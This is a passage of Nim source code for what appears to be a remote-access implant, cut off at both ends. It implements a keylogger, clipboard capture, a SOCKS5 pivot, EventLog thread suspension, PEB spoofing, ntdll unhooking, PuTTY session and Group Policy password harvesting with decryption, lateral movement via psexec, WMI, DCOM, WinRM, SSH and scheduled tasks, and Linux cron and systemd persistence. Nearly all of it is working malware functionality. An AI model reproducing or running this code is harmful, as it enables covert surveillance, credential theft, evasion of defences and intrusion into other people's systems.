      var wbuf: array[4, WCHAR]
      let n = ToUnicode(khs.vkCode, khs.scanCode, addr state[0], addr wbuf[0], int32(4), UINT(0))
      if n > 0:
        for chi in 0..<int(n):
          let wi = int(wbuf[chi])
          if wi >= 32 and wi < 127: gKeylogBuf.add(char(wi))
          elif wi == 13: gKeylogBuf.add('\n')
    return CallNextHookEx(0, nCode, wParam, lParam)

  proc keylogThreadProc(p: LPVOID): DWORD {.stdcall.} =
    gKeylogHook = SetWindowsHookExW(int32(WH_KEYBOARD_LL), keylogHookCb, 0, 0)
    var msg: MSG
    while not gKeylogStop:
      while PeekMessageW(addr msg, 0, 0, 0, UINT(PM_REMOVE)).bool:
        discard TranslateMessage(addr msg)
        discard DispatchMessageW(addr msg)
      Sleep(DWORD(10))
    if gKeylogHook != 0: discard UnhookWindowsHookEx(gKeylogHook); gKeylogHook = 0
    return 0

  # ── Clipboard monitor ────────────────────────────────────────────────────────
  proc clipMonThreadProc(p: LPVOID): DWORD {.stdcall.} =
    gClipStop = false
    var last = ""
    while not gClipStop:
      if OpenClipboard(0).bool:
        let hData = GetClipboardData(UINT(CF_TEXT))
        if hData != 0:
          let p2 = GlobalLock(hData)
          if p2 != nil:
            let text = $cast[cstring](p2)
            if text != last:
              gClipBuf.add("[clip] " & text[0..min(399, text.len-1)] & "\n")
              last = text
            discard GlobalUnlock(hData)
        discard CloseClipboard()
      for _ in 0..<gClipInterval * 10:
        if gClipStop: break
        Sleep(DWORD(100))
    gClipStop = true; return 0

  # ── File search ──────────────────────────────────────────────────────────────
  type PPathMatchSpec = proc(pszFile, pszSpec: LPWSTR): WINBOOL {.stdcall.}

  proc searchDirImpl(dir, pattern: string; results: var seq[string]; limit: int;
                     pmatch: PPathMatchSpec) =
    if results.len >= limit: return
    let findPath = dir & "\\*"
    var fd: WIN32_FIND_DATAW
    let h = FindFirstFileW(newWideCString(findPath), addr fd)
    if h == INVALID_HANDLE_VALUE: return
    defer: discard FindClose(h)
    while true:
      let name = $cast[WideCString](addr fd.cFileName[0])
      if name != "." and name != "..":
        let full = dir & "\\" & name
        if (fd.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) != 0:
          searchDirImpl(full, pattern, results, limit, pmatch)
        else:
          var matched = false
          if pmatch != nil:
            matched = pmatch(newWideCString(name), newWideCString(pattern)).bool
          if not matched:
            matched = name.toLowerAscii.contains(pattern.strip(chars={'*','?'}).toLowerAscii)
          if matched and results.len < limit: results.add(full)
      if FindNextFileW(h, addr fd) == 0: break

  proc searchDir(dir, pattern: string; results: var seq[string]; limit: int) =
    let hShl = LoadLibraryA("shlwapi.dll")
    let pmatch: PPathMatchSpec =
      if hShl != 0: cast[PPathMatchSpec](GetProcAddress(hShl, "PathMatchSpecW"))
      else: nil
    searchDirImpl(dir, pattern, results, limit, pmatch)
    if hShl != 0: discard FreeLibrary(hShl)

  # ── Windows SOCKS5 ───────────────────────────────────────────────────────────
  proc socksRelayProc(p: LPVOID): DWORD {.stdcall.} =
    if p == nil: return 1
    let rp = cast[ptr RelayParam](p)
    let src = rp.src; let dst = rp.dst
    dealloc(p)
    var buf: array[4096, char]
    while true:
      let n = recv(src, addr buf[0], int32(4096), 0)
      if n <= 0: break
      var sent = 0
      while sent < int(n):
        let s = send(dst, addr buf[sent], int32(int(n) - sent), 0)
        if s <= 0: break
        sent += int(s)
    discard shutdown(dst, int32(SD_BOTH)); return 0

  proc socksClientProc(p: LPVOID): DWORD {.stdcall.} =
    let clientSock = cast[SOCKET](cast[int](p))
    var buf: array[256, byte]
    var n = recv(clientSock, cast[ptr char](addr buf[0]), int32(256), 0)
    if n < 3 or int(buf[0]) != 5: discard closesocket(clientSock); return 1
    var authReply: array[2, byte] = [0x05'u8, 0x00'u8]
    discard send(clientSock, cast[ptr char](addr authReply[0]), int32(2), 0)
    n = recv(clientSock, cast[ptr char](addr buf[0]), int32(256), 0)
    if n < 7 or int(buf[1]) != 1: discard closesocket(clientSock); return 1
    var targetHost = ""; var targetPort: uint16 = 0
    case int(buf[3])
    of 1:
      if n < 10: discard closesocket(clientSock); return 1
      targetHost = $int(buf[4]) & "." & $int(buf[5]) & "." & $int(buf[6]) & "." & $int(buf[7])
      targetPort = (uint16(buf[8]) shl 8) or uint16(buf[9])
    of 3:
      let dlen = int(buf[4])
      if n < 5 + dlen + 2: discard closesocket(clientSock); return 1
      for di in 0..<dlen: targetHost.add(char(buf[5+di]))
      targetPort = (uint16(buf[5+dlen]) shl 8) or uint16(buf[6+dlen])
    else:
      discard closesocket(clientSock); return 1
    let targetSock = socket(int32(AF_INET), int32(SOCK_STREAM), int32(IPPROTO_TCP))
    if targetSock == INVALID_SOCKET: discard closesocket(clientSock); return 1
    var csa: sockaddr_in
    csa.sin_family = int16(AF_INET); csa.sin_port = htons(targetPort)
    var hostCS = targetHost & "\x00"
    let ipAddr = inet_addr(addr hostCS[0])
    if ipAddr == INADDR_NONE:
      let he = gethostbyname(addr hostCS[0])
      if he == nil or he.h_addr_list == nil or he.h_addr_list[] == nil:
        discard closesocket(targetSock); discard closesocket(clientSock); return 1
      csa.sin_addr.S_addr = cast[ptr int32](he.h_addr_list[])[]
    else:
      csa.sin_addr.S_addr = ipAddr
    if connect(targetSock, cast[ptr sockaddr](addr csa), int32(sizeof(csa))) != 0:
      discard closesocket(targetSock); discard closesocket(clientSock); return 1
    var reply: array[10, byte] = [0x05'u8,0x00'u8,0x00'u8,0x01'u8,0'u8,0'u8,0'u8,0'u8,0'u8,0'u8]
    discard send(clientSock, cast[ptr char](addr reply[0]), int32(10), 0)
    let rp1 = cast[ptr RelayParam](alloc0(sizeof(RelayParam)))
    rp1.src = clientSock; rp1.dst = targetSock
    let rp2 = cast[ptr RelayParam](alloc0(sizeof(RelayParam)))
    rp2.src = targetSock; rp2.dst = clientSock
    var rtid: DWORD = 0
    let t1 = CreateThread(nil, 0, socksRelayProc, cast[LPVOID](rp1), 0, addr rtid)
    let t2 = CreateThread(nil, 0, socksRelayProc, cast[LPVOID](rp2), 0, addr rtid)
    if t1 != 0 and t2 != 0:
      var ths: array[2, HANDLE] = [t1, t2]
      discard WaitForMultipleObjects(int32(2), addr ths[0], int32(1), DWORD(INFINITE))
    if t1 != 0: discard CloseHandle(t1)
    if t2 != 0: discard CloseHandle(t2)
    discard closesocket(clientSock); discard closesocket(targetSock); return 0

  proc socksServerProc(p: LPVOID): DWORD {.stdcall.} =
    var wsaData: WSADATA
    discard WSAStartup(WORD(0x0202), addr wsaData)
    let port = cast[int](p)
    let listenSock = socket(int32(AF_INET), int32(SOCK_STREAM), int32(IPPROTO_TCP))
    if listenSock == INVALID_SOCKET: return 1
    gSocksSocket = listenSock
    var lsa: sockaddr_in
    lsa.sin_family = int16(AF_INET); lsa.sin_port = htons(uint16(port)); lsa.sin_addr.S_addr = int32(0)
    var reuseOpt: int32 = 1
    discard setsockopt(listenSock, int32(SOL_SOCKET), int32(SO_REUSEADDR),
      cast[ptr char](addr reuseOpt), int32(sizeof(reuseOpt)))
    if `bind`(listenSock, cast[ptr sockaddr](addr lsa), int32(sizeof(lsa))) != 0:
      discard closesocket(listenSock); gSocksSocket = INVALID_SOCKET; return 1
    if listen(listenSock, int32(5)) != 0:
      discard closesocket(listenSock); gSocksSocket = INVALID_SOCKET; return 1
    while not gSocksStop:
      var cAddr: sockaddr_in; var cLen: int32 = int32(sizeof(cAddr))
      let cSock = accept(listenSock, cast[ptr sockaddr](addr cAddr), addr cLen)
      if cSock == INVALID_SOCKET: break
      var stid: DWORD = 0
      discard CloseHandle(CreateThread(nil, 0, socksClientProc,
        cast[LPVOID](cast[int](cSock)), 0, addr stid))
    discard closesocket(listenSock); gSocksSocket = INVALID_SOCKET; return 0

  # ── Other Windows helpers ────────────────────────────────────────────────────
  proc doBlockDlls(enable: bool): string =
    var policy: DWORD = if enable: 1 else: 0
    if SetProcessMitigationPolicy(int32(8), cast[PVOID](addr policy), SIZE_T(sizeof(policy))) == 0:
      return "SetProcessMitigationPolicy failed (err " & $GetLastError() & ")"
    return if enable: "[+] BLOCKDLLS enabled" else: "[+] BLOCKDLLS disabled"

  proc getServicePid(name: string): DWORD =
    let hScm = OpenSCManagerW(nil, nil, SC_MANAGER_ENUMERATE_SERVICE)
    if hScm == 0: return 0
    defer: CloseServiceHandle(hScm)
    let wname = newWideCString(name)
    let hSvc = OpenServiceW(hScm, wname, SERVICE_QUERY_STATUS)
    if hSvc == 0: return 0
    defer: CloseServiceHandle(hSvc)
    var needed: DWORD = 0
    var buf: array[256, byte]
    discard QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
      cast[LPBYTE](addr buf[0]), DWORD(sizeof(buf)), addr needed)
    return cast[ptr SERVICE_STATUS_PROCESS](addr buf[0]).dwProcessId

  proc doEventlogSuspendResume(suspend: bool): string =
    let pid = getServicePid("EventLog")
    if pid == 0: return "[-] EventLog service not found or not running"
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if snap == INVALID_HANDLE_VALUE: return "[-] CreateToolhelp32Snapshot failed"
    defer: CloseHandle(snap)
    var te: THREADENTRY32; te.dwSize = DWORD(sizeof(te))
    var count = 0
    if Thread32First(snap, addr te).bool:
      while true:
        if te.th32OwnerProcessID == pid:
          let th = OpenThread(THREAD_SUSPEND_RESUME, 0, te.th32ThreadID)
          if th != 0:
            if suspend: discard SuspendThread(th) else: discard ResumeThread(th)
            CloseHandle(th); count += 1
        if not Thread32Next(snap, addr te).bool: break
    let action = if suspend: "suspended" else: "resumed"
    return fmt"[+] {action} {count} threads of EventLog (PID {pid})"

  proc doPebSpoof(newPath: string): string =
    if newPath.len == 0: return "empty path"
    var pbi: PROCESS_BASIC_INFORMATION; var retLen: ULONG = 0
    if NtQueryInformationProcess(GetCurrentProcess(), processBasicInformation,
        cast[PVOID](addr pbi), ULONG(sizeof(pbi)), addr retLen) != 0:
      return "NtQueryInformationProcess failed"
    let peb = pbi.PebBaseAddress
    if peb == nil: return "PEB is nil"
    let pp = peb.ProcessParameters
    if pp == nil: return "ProcessParameters is nil"
    var wchars = newSeq[WCHAR](newPath.len + 1)
    for ci in 0..<newPath.len: wchars[ci] = WCHAR(ord(newPath[ci]))
    wchars[newPath.len] = WCHAR(0)
    let newBytes = newPath.len * 2
    var old: DWORD = 0
    for si in 0..1:
      let us: ptr UNICODE_STRING = if si == 0: addr pp.ImagePathName else: addr pp.CommandLine
      if us.Buffer == nil: continue
      if int(us.MaximumLength) < newBytes + 2: continue
      discard VirtualProtect(cast[LPVOID](us.Buffer), SIZE_T(newBytes + 2), PAGE_READWRITE, addr old)
      copyMem(cast[pointer](us.Buffer), cast[pointer](addr wchars[0]), newBytes + 2)
      discard VirtualProtect(cast[LPVOID](us.Buffer), SIZE_T(newBytes + 2), old, addr old)
      us.Length = USHORT(newBytes)
    return "[+] PEB spoofed to " & newPath

  proc doNtdllUnhook(): string =
    let freshBase = LoadLibraryExW(newWideCString("ntdll.dll"), 0, DWORD(DONT_RESOLVE_DLL_REFERENCES))
    if freshBase == 0: return "LoadLibraryEx(ntdll) failed"
    defer: discard FreeLibrary(freshBase)
    let liveBase = GetModuleHandleW(newWideCString("ntdll.dll"))
    if liveBase == 0: return "GetModuleHandle(ntdll) failed"
    let dosHdr = cast[ptr IMAGE_DOS_HEADER](liveBase)
    let ntHdr = cast[PIMAGE_NT_HEADERS](cast[int](liveBase) + dosHdr.e_lfanew)
    let expRVA = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    if expRVA == 0: return "no export directory"
    let expDir = cast[ptr IMAGE_EXPORT_DIRECTORY](cast[int](liveBase) + int(expRVA))
    let namesArr = cast[ptr UncheckedArray[DWORD]](cast[int](liveBase) + int(expDir.AddressOfNames))
    let ordsArr  = cast[ptr UncheckedArray[WORD]](cast[int](liveBase) + int(expDir.AddressOfNameOrdinals))
    let funcsArr = cast[ptr UncheckedArray[DWORD]](cast[int](liveBase) + int(expDir.AddressOfFunctions))
    var count = 0
    for ni in 0..<int(expDir.NumberOfNames):
      let fname = $cast[cstring](cast[int](liveBase) + int(namesArr[ni]))
      if fname.len < 2 or fname[0] != 'N' or fname[1] != 't': continue
      let funcRVA = int(funcsArr[int(ordsArr[ni])])
      let liveFunc  = cast[ptr byte](cast[int](liveBase)  + funcRVA)
      let freshFunc = cast[ptr byte](cast[int](freshBase) + funcRVA)
      if liveFunc[] == 0xE9'u8:
        var old2: DWORD = 0
        if VirtualProtect(cast[LPVOID](liveFunc), SIZE_T(8), PAGE_EXECUTE_READWRITE, addr old2) != 0:
          copyMem(liveFunc, freshFunc, 8)
          discard VirtualProtect(cast[LPVOID](liveFunc), SIZE_T(8), old2, addr old2)
          inc count
    return "[+] unhooked " & $count & " Nt* functions"

  proc doSessionGopher(): string =
    var output = ""
    block putty:
      var hKey: HKEY
      if RegOpenKeyExW(HKEY_CURRENT_USER,
          newWideCString("Software\\SimonTatham\\PuTTY\\Sessions"),
          0, KEY_READ, addr hKey) != 0: break putty
      var idx: DWORD = 0
      while true:
        var nameBuf: array[256, WCHAR]; var nameLen: DWORD = 256
        if RegEnumKeyExW(hKey, idx, addr nameBuf[0], addr nameLen, nil, nil, nil, nil) != 0: break
        let sname = $cast[WideCString](addr nameBuf[0])
        var hSess: HKEY
        if RegOpenKeyExW(hKey, newWideCString(sname), 0, KEY_READ, addr hSess) == 0:
          var vbuf: array[512, WCHAR]; var vlen: DWORD = 0; var rtype: DWORD = 0
          var host, user, port = ""
          vlen = DWORD(sizeof(vbuf))
          if RegQueryValueExW(hSess, newWideCString("HostName"), nil, addr rtype,
              cast[LPBYTE](addr vbuf[0]), addr vlen) == 0:
            host = $cast[WideCString](addr vbuf[0])
          var portVal: DWORD = 22; vlen = DWORD(sizeof(portVal))
          if RegQueryValueExW(hSess, newWideCString("PortNumber"), nil, addr rtype,
              cast[LPBYTE](addr portVal), addr vlen) == 0: port = $portVal
          else: port = "22"
          vlen = DWORD(sizeof(vbuf))
          if RegQueryValueExW(hSess, newWideCString("UserName"), nil, addr rtype,
              cast[LPBYTE](addr vbuf[0]), addr vlen) == 0:
            user = $cast[WideCString](addr vbuf[0])
          output.add("[PuTTY] " & sname & " host=" & host & " port=" & port & " user=" & user & "\n")
          discard RegCloseKey(hSess)
        idx = idx + DWORD(1)
      discard RegCloseKey(hKey)
    return if output == "": "no sessions found" else: output

  proc doGppHunt(): string =
    let xmlFiles = runShell("dir /s /b %LOGONSERVER%\\SYSVOL\\*.xml 2>nul")
    if xmlFiles.strip() == "": return "no .xml files found in SYSVOL"
    var output = ""
    for line in xmlFiles.splitLines():
      let f = line.strip()
      if f.len == 0: continue
      var content: string
      try: content = readFile(f)
      except: continue
      let cpIdx = content.find("cpassword=\"")
      if cpIdx < 0: continue
      let start = cpIdx + 11
      let eIdx = content.find('"', start)
      if eIdx < 0 or eIdx <= start: continue
      let cpass = content[start..<eIdx]
      if cpass.len == 0: continue
      let ps = "$k=[byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62," &
        "0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6," &
        "0x6c,0x1b);" &
        "try{$d=[Convert]::FromBase64String('" & cpass & "');" &
        "$a=[Security.Cryptography.AesManaged]::new();" &
        "$a.Key=$k;$a.IV=New-Object byte[] 16;$a.Mode='CBC';$a.Padding='Zeros';" &
        "$dc=$a.CreateDecryptor();" &
        "$pt=$dc.TransformFinalBlock($d,0,$d.Length);" &
        "[Text.Encoding]::Unicode.GetString($pt).TrimEnd([char]0)}catch{'[decrypt failed]'}"
      let dec = runShell("powershell.exe -NoP -NonI -W Hidden -C \"" & ps & "\"")
      output.add("file: " & f & "\ncpassword: " & cpass & "\nplaintext: " & dec.strip() & "\n\n")
    return if output == "": "no cpasswords found" else: output

  proc smbStage(host, name, user, pass: string; data: seq[byte]): string =
    ## Upload data to the remote host via SMB (ADMIN$ then C$\Windows\Temp).
    ## Returns the remote Windows path on success, "" on failure.
    # Disconnect any implicit machine-account session first (prevents error 3775).
    discard runShell("net use \\\\" & host & " /delete /y 2>nul")
    if user != "" and pass != "":
      discard runShell("net use \\\\" & host & "\\IPC$ \"" & pass & "\" /user:\"" & user & "\" 2>&1")
    defer:
      if user != "": discard runShell("net use \\\\" & host & "\\IPC$ /delete /y 2>&1")
    let unc1 = "\\\\" & host & "\\ADMIN$\\" & name
    let unc2 = "\\\\" & host & "\\C$\\Windows\\Temp\\" & name
    let unc3 = "\\\\" & host & "\\C$\\Users\\Public\\" & name
    try:
      writeFile(unc1, cast[string](data))
      return "C:\\Windows\\" & name
    except: discard
    try:
      writeFile(unc2, cast[string](data))
      return "C:\\Windows\\Temp\\" & name
    except: discard
    try:
      writeFile(unc3, cast[string](data))
      return "C:\\Users\\Public\\" & name
    except: discard
    return ""

  proc doLateral(meth, host, user, pass, cmd: string; payData: seq[byte] = @[]): string =
    if meth == "atexec":
      let tn = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
      var out2 = ""
      if user != "":
        out2.add(runShell("net use \\\\" & host & "\\IPC$ \"" & pass &
          "\" /user:\"" & user & "\" 2>&1") & "\n")
      let atStart = runasStartTime()
      out2.add(runShell("schtasks /Create /S " & host & " /RU SYSTEM /SC ONCE /ST " & atStart & " /F /TN " &
        tn & " /TR \"" & cmd & "\" 2>&1") & "\n")
      out2.add(runShell("schtasks /Run /S " & host & " /TN " & tn & " 2>&1") & "\n")
      Sleep(DWORD(3000))
      out2.add(runShell("schtasks /Delete /S " & host & " /TN " & tn & " /F 2>&1") & "\n")
      if user != "": discard runShell("net use \\\\" & host & "\\IPC$ /delete 2>&1")
      return "[+] atexec → " & host & "\n    task: " & tn & "\n    cmd: " & cmd & "\n    runas: SYSTEM\n" & out2
    elif meth == "runas":
      let tn = "svc" & toHex(GetCurrentProcessId().uint32 xor GetTickCount().uint32, 8)
      let ru = if user.startsWith(".\\") or user.startsWith("./"): user[2..^1] else: user
      # Copy to C:\Users\Public\ so the target user can read it
      let baseName = extractFilename(cmd)
      if baseName == "": return "runas: payload path is empty"
      let pubPath = "C:\\Users\\Public\\" & baseName
      var effCmd = cmd
      if cmd != pubPath:
        try:
          copyFile(cmd, pubPath)
          effCmd = pubPath
        except:
          return "runas: could not stage payload in C:\\Users\\Public"
      if not fileExists(pubPath): return "runas: staged payload is not readable"
      var directPid: DWORD = 0
      let direct = spawnAsUserDirect(pubPath, user, pass, directPid)
      if direct.ok:
        return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & pubPath &
          "\n    pid: " & $directPid & "\n    method: " & direct.methodName

      let startAt = runasStartTime()
      let createOut = runShell("schtasks /Create /SC ONCE /ST " & startAt & " /RL HIGHEST /F /TN \"" & tn &
        "\" /TR \"" & effCmd & "\" /RU \"" & ru & "\" /RP \"" & pass & "\" 2>&1")
      if createOut.toUpperAscii().contains("ERROR:") or createOut.toLowerAscii().startsWith("[error:"):
        return "runas: direct launch failed\n" & direct.detail & "\nrunas: schtasks /Create failed\n" & createOut
      var out2 = createOut & "\n"
      let runOut = runShell("schtasks /Run /TN \"" & tn & "\" 2>&1")
      if runOut.toUpperAscii().contains("ERROR:") or runOut.toLowerAscii().startsWith("[error:"):
        discard runShell("schtasks /Delete /TN \"" & tn & "\" /F 2>&1")
        return "runas: schtasks /Run failed\n" & runOut
      out2.add(runOut & "\n")
      Sleep(DWORD(3000))
      out2.add(runShell("schtasks /Delete /TN \"" & tn & "\" /F 2>&1") & "\n")
      return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & effCmd &
        "\n    method: schtasks fallback (/ST " & startAt & ")\n    direct launch failed: " &
        direct.detail & "\n" & out2
    elif meth == "psexec":
      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
      let exeName = svcName & ".exe"
      let remotePath = smbStage(host, exeName, user, pass, payData)
      if remotePath == "": return "psexec: SMB staging failed"
      var whost = newWideCString("\\\\" & host)
      let hScm = OpenSCManagerW(whost, nil, SC_MANAGER_ALL_ACCESS)
      if hScm == 0: return "psexec: OpenSCManager failed: " & $GetLastError()
      defer: discard CloseServiceHandle(hScm)
      var wsvcName = newWideCString(svcName)
      var wexePath = newWideCString(remotePath)
      let hSvc = CreateServiceW(hScm, wsvcName, wsvcName, SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        wexePath, nil, nil, nil, nil, nil)
      if hSvc == 0: return "psexec: CreateService failed: " & $GetLastError()
      defer: discard CloseServiceHandle(hSvc)
      discard StartServiceW(hSvc, 0, nil)
      discard DeleteService(hSvc)
      return "[+] psexec → " & host & "\n    svc: " & svcName & "\n    path: " & remotePath
    elif meth == "wmi":
      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
      let exeName = svcName & ".exe"
      let remotePath = smbStage(host, exeName, user, pass, payData)
      if remotePath == "": return "wmi: SMB staging failed"
      # Use schtasks with explicit domain-user credentials so the child process
      # runs as the provided account (not SYSTEM/machine-account), enabling
      # cross-domain named-pipe auth back to the parent.
      let atStart = runasStartTime()
      var schedAuth = ""
      var ruAs = " /RU SYSTEM"
      if user != "" and pass != "":
        schedAuth = " /U \"" & user & "\" /P \"" & pass & "\""
        ruAs = " /RU \"" & user & "\" /RP \"" & pass & "\""
      let createOut = runShell("schtasks /Create /S " & host & schedAuth & ruAs &
        " /SC ONCE /ST " & atStart & " /F /TN " & svcName & " /TR \"" & remotePath & "\" 2>&1")
      let runOut = runShell("schtasks /Run /S " & host & schedAuth & " /TN " & svcName & " 2>&1")
      discard runShell("schtasks /Delete /S " & host & schedAuth & " /TN " & svcName & " /F 2>&1")
      return "[+] wmi → " & host & "\n    path: " & remotePath & "\n" & createOut.strip() & "\n" & runOut.strip()
    elif meth == "smbexec":
      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
      let exeName = svcName & ".exe"
      let remotePath = smbStage(host, exeName, user, pass, payData)
      if remotePath == "": return "smbexec: SMB staging failed"
      let binPath = "C:\\Windows\\System32\\cmd.exe /Q /c start \"\" /min \"" & remotePath & "\""
      var whost = newWideCString("\\\\" & host)
      let hScm = OpenSCManagerW(whost, nil, SC_MANAGER_ALL_ACCESS)
      if hScm == 0: return "smbexec: OpenSCManager failed: " & $GetLastError()
      defer: discard CloseServiceHandle(hScm)
      var wsvcName = newWideCString(svcName)
      var wbinPath = newWideCString(binPath)
      let hSvc = CreateServiceW(hScm, wsvcName, wsvcName, SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        wbinPath, nil, nil, nil, nil, nil)
      if hSvc == 0: return "smbexec: CreateService failed: " & $GetLastError()
      defer: discard CloseServiceHandle(hSvc)
      discard StartServiceW(hSvc, 0, nil)
      discard DeleteService(hSvc)
      return "[+] smbexec → " & host & "\n    svc: " & svcName & "\n    chain: SERVICES.EXE→cmd.exe→agent"
    elif meth == "dcom":
      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
      let exeName = svcName & ".exe"
      let remotePath = smbStage(host, exeName, user, pass, payData)
      if remotePath == "": return "dcom: SMB staging failed"
      let safePath = remotePath.replace("\"", "\\\"")
      let psCmd = "$c=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','" &
        host & "'));$c.Document.ActiveView.ExecuteShellCommand('" & safePath & "',$null,'','7')"
      let shellCmd = "powershell -NoP -W Hidden -Exec Bypass -C \"" & psCmd.replace("\"", "\\\"") & "\""
      let out2 = runShell(shellCmd)
      return "[+] dcom → " & host & "\n    path: " & remotePath & "\n" & out2.strip()
    elif meth == "winrm":
      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
      let exeName = svcName & ".exe"
      let remotePath = smbStage(host, exeName, user, pass, payData)
      if remotePath == "": return "winrm: SMB staging failed"
      var psCmd: string
      # Force NTLM: resolve hostname to IPv4 (skip IPv6 with AddressFamily -ne 23),
      # set TrustedHosts=*, and pass -Authentication NTLM to bypass Kerberos/Negotiate.
      # 0x8009030d (SEC_E_NO_CREDENTIALS) occurs when Negotiate tries Kerberos for a
      # local account on a domain-joined machine — NTLM auth resolves this.
      let addTrust = "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;" &
                     "try{$ip=([System.Net.Dns]::GetHostAddresses('" & host & "')|" &
                     "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}" &
                     "catch{$ip='" & host & "'};"
      if user != "" and pass != "":
        psCmd = addTrust & "$c=New-Object PSCredential('" & user & "',(ConvertTo-SecureString '" & pass &
                "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication NTLM" &
                " -Credential $c -ScriptBlock {Start-Process '" & remotePath & "' -WindowStyle Hidden}"
      else:
        psCmd = addTrust & "Invoke-Command -ComputerName $ip -Authentication NTLM -ScriptBlock {Start-Process '" & remotePath & "' -WindowStyle Hidden}"
      let shellCmd = "powershell -NoP -W Hidden -Exec Bypass -C \"" & psCmd.replace("\"", "\\\"") & "\""
      let out2 = runShell(shellCmd)
      return "[+] winrm → " & host & "\n    path: " & remotePath & "\n" & out2.strip()
    elif meth == "ssh":
      let exeName = "agent_" & $getTime().toUnix() & ".elf"
      let remotePath = "/tmp/" & exeName
      let tmpPath = getTempDir() & "\\" & exeName
      try: writeFile(tmpPath, cast[string](payData)) except: return "ssh: failed to write temp file"
      defer: (try: removeFile(tmpPath) except: discard)
      let sshOpts = "-o StrictHostKeyChecking=no -o BatchMode=yes"
      let addr2 = if ':' in host: host else: host & ":22"
      let hostPart = addr2.split(':')[0]
      let portPart = if ':' in addr2: addr2.split(':')[1] else: "22"
      let scpCmd = "scp -P " & portPart & " " & sshOpts & " \"" & tmpPath & "\" " &
                   user & "@" & hostPart & ":" & remotePath
      var out2 = runShell(scpCmd & " 2>&1") & "\n"
      let execCmd = "ssh -p " & portPart & " " & sshOpts & " " & user & "@" & hostPart &
                    " \"chmod +x " & remotePath & " && nohup " & remotePath & " </dev/null >/dev/null 2>&1 &\""
      out2.add(runShell(execCmd & " 2>&1"))
      return "[+] ssh → " & host & "\n    path: " & remotePath & "\n" & out2.strip()
    else:
      return "unknown lateral method: " & meth & " — use psexec|wmi|smbexec|dcom|winrm|ssh|atexec|runas"

# ─────────────────────────────────────────────────────────────────────────────
# Linux-specific procs
# ─────────────────────────────────────────────────────────────────────────────
when not defined(windows):
  proc doScreenshotLinux(): (seq[byte], bool) =
    let display = os.getEnv("DISPLAY", "")
    if display == "": return (@[], true)
    let tmpPath = "/tmp/endgame_ss_" & $posixLib.getpid() & ".png"
    try:
      let (_, code) = execCmdEx("import -window root " & tmpPath)
      if code != 0: return (@[], true)
      let data = cast[seq[byte]](readFile(tmpPath))
      removeFile(tmpPath)
      return (data, false)
    except: return (@[], true)

  proc doPersistLinux(name, cmd, meth: string): string =
    if meth == "systemd":
      let unitDir = os.getEnv("HOME", "/root") & "/.config/systemd/user/"
      try: createDir(unitDir) except: discard
      let unitPath = unitDir & name & ".service"
      let unit = "[Unit]\nDescription=" & name & "\n[Service]\nExecStart=" & cmd &
                 "\nRestart=always\n[Install]\nWantedBy=default.target\n"
      writeFile(unitPath, unit)
      let (_, c1) = execCmdEx("systemctl --user daemon-reload 2>&1")
      let (_, c2) = execCmdEx("systemctl --user enable " & name & " 2>&1")
      return if c1 == 0 and c2 == 0: "[+] systemd user unit installed: " & name
             else: "[~] unit written but enable may need loginctl linger"
    # default: cron
    let cronLine = "* * * * * " & cmd & " # " & name
    let (existing, _) = execCmdEx("crontab -l 2>/dev/null")
    if cronLine in existing: return "[-] cron entry already present"
    let newCron = existing & "\n" & cronLine & "\n"
    let tmpCron = "/tmp/endgame_cron_" & $posixLib.getpid()
    writeFile(tmpCron, newCron)
    let (_, rc) = execCmdEx("crontab " & tmpCron)
    removeFile(tmpCron)
    return if rc == 0: "[+] cron entry added for: " & name else: "[-] crontab failed"

  proc doPersistRmLinux(name, meth: string): string =
    if meth == "systemd":
      discard execCmdEx("systemctl --user disable " & name & " 2>&1")
      let unitPath = os.getEnv("HOME", "/root") & "/.config/systemd/user/" & name & ".service"
      try: removeFile(unitPath) except: discard
      return "[+] systemd unit removed: " & name
    # cron: remove matching line
    let (existing, _) = execCmdEx("crontab -l 2>/dev/null")
    var newLines: seq[string]
    for line in existing.splitLines():
      if ("# " & name) notin line: newLines.add(line)
    let newCron = newLines.join("\n") & "\n"
    let tmpCron = "/tmp/endgame_cron_" & $posixLib.getpid()
    writeFile(tmpCron, newCron)
    let (_, rc) = execCmdEx("crontab " & tmpCron)
    removeFile(tmpCron)
    return if rc == 0: "[+] cron entry removed: " & name else: "[-] crontab remove failed"

  proc doPortScanLinux(host, ports: string; timeoutMs: int): string =
    var result2 = ""
    for portStr in ports.split(','):
      let portStr2 = portStr.strip()
      if portStr2 == "": continue
      var portNum: int
      try: portNum = parseInt(portStr2) except: continue
      try:
        let sock = newSocket()
        defer: sock.close()
        sock.connect(host, Port(portNum), timeoutMs)
        result2.add("OPEN " & host & ":" & portStr2 & "\n")
      except: discard
    return if result2 == "": "no open ports" else: result2

  proc doSysinfoLinux(): string =
    var info = ""
    try:
      var hbuf: array[256, char]
      discard posixLib.gethostname(cast[cstring](addr hbuf[0]), 256.cint)
      info.add("hostname=" & $cast[cstring](addr hbuf[0]) & "\n")
    except: discard
